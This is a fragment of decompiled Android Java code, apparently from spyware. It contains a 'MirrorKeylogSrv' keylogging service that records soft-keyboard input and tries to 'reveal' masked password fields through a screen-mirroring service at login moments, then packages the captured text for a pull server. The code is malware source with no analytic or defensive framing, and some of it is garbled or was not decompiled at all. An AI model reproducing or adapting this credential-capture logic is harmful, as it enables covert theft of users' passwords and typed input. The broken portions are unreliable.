    /* JADX WARN: Code duplicated, block: B:45:0x0093 A[Catch: all -> 0x00a5, TryCatch #1 {, blocks: (B:3:0x0001, B:5:0x0005, B:8:0x000b, B:41:0x0082, B:43:0x0088, B:45:0x0093, B:47:0x0097, B:48:0x0099, B:49:0x009a, B:50:0x00a1, B:51:0x00a2, B:52:0x00a4, B:58:0x00aa, B:59:0x00ae, B:13:0x002b, B:40:0x007c, B:36:0x006f, B:30:0x004d, B:16:0x0031), top: B:66:0x0001, inners: #0, #3 }] */
    /* JADX WARN: Code duplicated, block: B:47:0x0097 A[Catch: all -> 0x00a5, TryCatch #1 {, blocks: (B:3:0x0001, B:5:0x0005, B:8:0x000b, B:41:0x0082, B:43:0x0088, B:45:0x0093, B:47:0x0097, B:48:0x0099, B:49:0x009a, B:50:0x00a1, B:51:0x00a2, B:52:0x00a4, B:58:0x00aa, B:59:0x00ae, B:13:0x002b, B:40:0x007c, B:36:0x006f, B:30:0x004d, B:16:0x0031), top: B:66:0x0001, inners: #0, #3 }] */
    /* JADX WARN: Code duplicated, block: B:49:0x009a A[Catch: all -> 0x00a5, TryCatch #1 {, blocks: (B:3:0x0001, B:5:0x0005, B:8:0x000b, B:41:0x0082, B:43:0x0088, B:45:0x0093, B:47:0x0097, B:48:0x0099, B:49:0x009a, B:50:0x00a1, B:51:0x00a2, B:52:0x00a4, B:58:0x00aa, B:59:0x00ae, B:13:0x002b, B:40:0x007c, B:36:0x006f, B:30:0x004d, B:16:0x0031), top: B:66:0x0001, inners: #0, #3 }] */
    /* JADX WARN: Code duplicated, block: B:51:0x00a2 A[Catch: all -> 0x00a5, TryCatch #1 {, blocks: (B:3:0x0001, B:5:0x0005, B:8:0x000b, B:41:0x0082, B:43:0x0088, B:45:0x0093, B:47:0x0097, B:48:0x0099, B:49:0x009a, B:50:0x00a1, B:51:0x00a2, B:52:0x00a4, B:58:0x00aa, B:59:0x00ae, B:13:0x002b, B:40:0x007c, B:36:0x006f, B:30:0x004d, B:16:0x0031), top: B:66:0x0001, inners: #0, #3 }] */
    /* JADX WARN: Code duplicated, block: B:55:0x00a7 A[DONT_GENERATE] */
    /* JADX WARN: Instruction removed from duplicated block: B:55:0x00a7, please report this as an issue */
    public final synchronized void L() {
        Throwable thD;
        if (!this.f4311e && !this.f4312f) {
            this.f4311e = true;
            this.f4310d.set(false);
            long j3 = this.f4319m;
            long jNanoTime = System.nanoTime();
            long nanos = TimeUnit.MILLISECONDS.toNanos(j3) + jNanoTime;
            if (nanos < jNanoTime) {
                nanos = Long.MAX_VALUE;
            }
            try {
                j(nanos);
                thD = null;
            } catch (Throwable th) {
                try {
                    thD = D(null, "drain ingress", th);
                } catch (Throwable th2) {
                    this.f4311e = false;
                    this.f4312f = true;
                    throw th2;
                }
            }
            try {
                e5 e5Var = this.f4318l;
                synchronized (e5Var) {
                    HandlerThread handlerThread = e5Var.f3873a;
                    e5Var.f3874b = null;
                    e5Var.f3873a = null;
                    if (handlerThread != null) {
                        handlerThread.quitSafely();
                    }
                }
            } catch (Throwable th3) {
                thD = D(thD, "shutdown scheduler", th3);
            }
            try {
                if (this.f4316j.z(Math.max(0L, nanos - System.nanoTime()))) {
                    this.f4317k.k();
                    this.f4311e = false;
                    this.f4312f = true;
                    if (thD != null) {
                        Log.e("MirrorKeylogSrv", "Keylog shutdown completed with failures", thD);
                        if (!(thD instanceof RuntimeException)) {
                            throw ((RuntimeException) thD);
                        }
                        if (thD instanceof Error) {
                            throw new IllegalStateException("keylog shutdown failed", thD);
                        }
                        throw ((Error) thD);
                    }
                    return;
                }
                Log.e("MirrorKeylogSrv", "Keylog writer close exceeded stop deadline; daemon drain continues");
                try {
                    this.f4317k.k();
                } catch (Throwable th4) {
                    thD = D(thD, "stop pull server", th4);
                }
                this.f4311e = false;
                this.f4312f = true;
                if (thD != null) {
                    Log.e("MirrorKeylogSrv", "Keylog shutdown completed with failures", thD);
                    if (!(thD instanceof RuntimeException)) {
                        throw ((RuntimeException) thD);
                    }
                    if (thD instanceof Error) {
                        throw new IllegalStateException("keylog shutdown failed", thD);
                    }
                    throw ((Error) thD);
                }
                return;
            } catch (Throwable th5) {
                thD = D(thD, "close writer", th5);
            }
            throw th;
        }
    }

    public final boolean i(String str, boolean z2) {
        if (this.f4329x != null && this.C > 0) {
            if (this.D) {
                if (System.currentTimeMillis() - this.E < 2000) {
                    Log.d("MirrorKeylogSrv", "[SoftKb] reveal skip: in-flight");
                    return false;
                }
                this.D = false;
            }
            if (this.G.contains(this.f4329x)) {
                Log.d("MirrorKeylogSrv", "[SoftKb] reveal skip: already captured");
                return false;
            }
            if (z2 && !H(this.C, this.f4324s, System.currentTimeMillis())) {
                Log.d("MirrorKeylogSrv", "[SoftKb] reveal skip: stale/short maskLen=" + this.C);
                return false;
            }
            ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
            if (screenMirrorServiceU2 != null) {
                this.D = true;
                this.E = System.currentTimeMillis();
                StringBuilder sbK = a0.a.k("[SoftKb] ", str, " reveal maskLen=");
                sbK.append(this.C);
                Log.d("MirrorKeylogSrv", sbK.toString());
                String str2 = this.f4329x;
                String str3 = this.B;
                int i3 = this.C;
                Handler handler = screenMirrorServiceU2.f2510k;
                handler.removeCallbacksAndMessages(null);
                screenMirrorServiceU2.y5();
                screenMirrorServiceU2.f2524o = str2;
                screenMirrorServiceU2.f2527p = i3;
                handler.postDelayed(new ja(screenMirrorServiceU2, str2, str3, i3, 2), 200L);
                return true;
            }
        }
        return false;
    }

    public final void j(long j3) {
        boolean z2;
        y.e eVar = this.f4315i;
        e5 e5Var = this.f4318l;
        synchronized (e5Var) {
            z2 = e5Var.f3873a != null && Looper.myLooper() == e5Var.f3873a.getLooper();
        }
        if (z2) {
            synchronized (this.f4313g) {
                this.f4314h = false;
            }
            try {
                p(eVar);
                k();
                return;
            } finally {
                eVar.f(this.f4318l);
            }
        }
        CountDownLatch countDownLatch = new CountDownLatch(1);
        synchronized (this.f4313g) {
            try {
                this.f4314h = false;
                if (!this.f4318l.a(new e2.q0(this, eVar, countDownLatch, 5))) {
                    Log.e("MirrorKeylogSrv", "Keylog stop barrier rejected; continuing cleanup");
                    eVar.f(this.f4318l);
                    k();
                    return;
                }
                try {
                    long jMax = Math.max(0L, j3 - System.nanoTime());
                    if (jMax <= 0) {
                        Log.e("MirrorKeylogSrv", "Keylog stop barrier reached total deadline; continuing cleanup");
                    } else {
                        try {
                            if (!countDownLatch.await(jMax, TimeUnit.NANOSECONDS)) {
                                Log.e("MirrorKeylogSrv", "Keylog stop barrier reached total deadline; continuing cleanup");
                            }
                        } catch (InterruptedException e3) {
                            Thread.currentThread().interrupt();
                            Log.e("MirrorKeylogSrv", "Keylog stop barrier interrupted; continuing cleanup", e3);
                        }
                    }
                } finally {
                    eVar.f(this.f4318l);
                    k();
                }
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public final void k() {
        this.f4325t = null;
        this.f4326u = null;
        this.F = null;
        this.f4308b.clear();
        d2.y yVar = this.f4309c;
        synchronized (yVar) {
            yVar.i();
            ((StringBuilder) yVar.f654d).setLength(0);
            yVar.f651a = "";
            yVar.f653c = -1L;
        }
        this.f4323r = false;
    }

    public final void l(d5 d5Var) {
        synchronized (this.f4313g) {
            try {
                y.e eVar = this.f4315i;
                if (this.f4314h) {
                    this.f4318l.a(new a2.h(d5Var, eVar, 21));
                }
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public final void p(y.e eVar) {
        ArrayList<String> arrayList;
        h2.i iVar = (h2.i) eVar.f5976c;
        synchronized (iVar) {
            if (iVar.f2052a) {
                arrayList = null;
            } else {
                arrayList = new ArrayList(this.f4307a.keySet());
            }
        }
        if (arrayList == null) {
            return;
        }
        for (String str : arrayList) {
            eVar.n(new a2.h(this, str, 20));
            q(str, eVar, true);
        }
    }

    public final void q(final String str, y.e eVar, final boolean z2) {
        Object obj;
        Supplier supplier = new Supplier() { // from class: w1.v4
            /* JADX WARN: Code restructure failed: missing block: B:51:0x0091, code lost:
            
                if ((r0 != null ? r0 : "").isEmpty() != false) goto L55;
             */
            @Override // java.util.function.Supplier
            /*
                Code decompiled incorrectly, please refer to instructions dump.
                To view partially-correct code enable 'Show inconsistent code' option in preferences
            */
            public final java.lang.Object get() {
                /*
                    r18 = this;
                    r0 = r18
                    w1.j5 r1 = r0.f5292a
                    java.util.HashMap r2 = r1.f4307a
                    java.lang.String r3 = r2
                    java.lang.Object r4 = r2.remove(r3)
                    w1.f5 r4 = (w1.f5) r4
                    r5 = 0
                    if (r4 == 0) goto Lae
                    java.lang.String r6 = r4.f3993b
                    if (r6 != 0) goto L17
                    goto Lae
                L17:
                    java.lang.String r6 = r4.f3998g
                    java.lang.String r7 = ""
                    if (r6 == 0) goto L1e
                    goto L1f
                L1e:
                    r6 = r7
                L1f:
                    boolean r8 = r4.f3997f
                    if (r8 == 0) goto L6a
                    java.lang.String r6 = r1.C(r3, r6)
                    d2.y r8 = r1.f4309c
                    java.lang.String r8 = r8.i()
                    if (r8 == 0) goto L46
                    boolean r9 = w1.j5.f(r6)
                    if (r9 != 0) goto L45
                    boolean r9 = r6.isEmpty()
                    if (r9 != 0) goto L45
                    int r9 = r8.length()
                    int r10 = r6.length()
                    if (r9 < r10) goto L46
                L45:
                    r6 = r8
                L46:
                    java.util.HashSet r1 = r1.G
                    boolean r1 = r1.contains(r3)
                    if (r1 == 0) goto L5a
                    boolean r1 = w1.j5.v(r6)
                    if (r1 == 0) goto L5a
                    r4.f4002k = r5
                    r2.put(r3, r4)
                    return r5
                L5a:
                    boolean r0 = r3
                    if (r0 != 0) goto L6a
                    boolean r0 = w1.j5.v(r6)
                    if (r0 == 0) goto L6a
                    r4.f4002k = r5
                    r2.put(r3, r4)
                    return r5
                L6a:
                    r11 = r6
                    boolean r0 = r11.isEmpty()
                    if (r0 == 0) goto L94
                    java.lang.String r0 = r4.f3999h
                    if (r0 != 0) goto L76
                    r0 = r7
                L76:
                    boolean r0 = r0.isEmpty()
                    if (r0 == 0) goto L94
                    java.lang.String r0 = r4.f4000i
                    if (r0 != 0) goto L81
                    r0 = r7
                L81:
                    boolean r0 = r0.isEmpty()
                    if (r0 == 0) goto L94
                    java.lang.String r0 = r4.f4001j
                    if (r0 != 0) goto L8c
                    goto L8d
                L8c:
                    r7 = r0
                L8d:
                    boolean r0 = r7.isEmpty()
                    if (r0 == 0) goto L94
                    goto Lae
                L94:
                    w1.g5 r8 = new w1.g5
                    java.lang.String r9 = r4.f3993b
                    java.lang.String r10 = r4.f3994c
                    java.lang.String r12 = r4.f3995d
                    java.lang.String r13 = r4.f3996e
                    boolean r14 = r4.f3997f
                    java.lang.String r15 = r4.f3992a
                    java.lang.String r0 = r4.f3999h
                    java.lang.String r1 = r4.f4000i
                    r16 = r0
                    r17 = r1
                    r8.<init>(r9, r10, r11, r12, r13, r14, r15, r16, r17)
                    return r8
                Lae:
                    return r5
                */
                throw new UnsupportedOperationException("Method not decompiled: w1.v4.get():java.lang.Object");
            }
        };
        h2.i iVar = (h2.i) eVar.f5976c;
        synchronized (iVar) {
            if (iVar.f2052a) {
                obj = null;
            } else {
                obj = supplier.get();
            }
        }
        g5 g5Var = (g5) obj;
        if (g5Var == null) {
            return;
        }
        String str2 = g5Var.f4073a;
        String str3 = g5Var.f4074b;
        String str4 = g5Var.f4075c;
        eVar.n(new w4(this, h("TEXT_COMMIT", str2, str3, str4, g5Var.f4076d, g5Var.f4077e, str4.length(), g5Var.f4078f, g5Var.f4079g, g5Var.f4080h, g5Var.f4081i), 0));
    }

    public final d2.x r() {
        d2.g gVar = this.f4316j;
        gVar.f573o.get();
        gVar.f574p.get();
        gVar.f575q.get();
        return new d2.x(gVar.f576r.get(), gVar.f565f.size(), gVar.f577s.get(), (String) gVar.f578t.get());
    }

    public final void x(String str, y.e eVar) {
        String str2 = this.f4325t;
        if (str2 != null && !str2.equals(str)) {
            p(eVar);
            k();
        }
        if (this.f4325t == null) {
            this.f4325t = str;
            this.f4326u = UUID.randomUUID().toString();
        }
    }

    public final void y() {
        i("login-moment", true);
    }

    public final void z(String str) {
        String str2;
        if (!G(str) || (str2 = this.f4329x) == null) {
            return;
        }
        if (str2.equals(this.F) || this.G.contains(this.f4329x)) {
            this.F = this.f4329x;
        } else if (i("focused-mask", false)) {
            this.F = this.f4329x;
        }
    }
}
